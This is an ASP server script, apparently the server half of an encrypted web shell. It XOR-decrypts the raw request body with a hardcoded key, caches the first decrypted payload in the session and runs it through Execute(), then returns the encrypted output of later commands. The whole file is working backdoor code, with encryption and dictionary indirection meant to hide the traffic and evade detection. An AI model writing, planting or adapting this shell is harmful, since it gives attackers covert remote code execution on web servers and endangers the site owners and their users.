<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    key="3c6e0b8a9c15224a"
    content=Request.BinaryRead(Request.TotalBytes)
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(content,false)
            Session("payload")=content
            response.End
        else
            content=decryption(content,true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite decryption(result,true)
            end if
        end if
    end if
%>
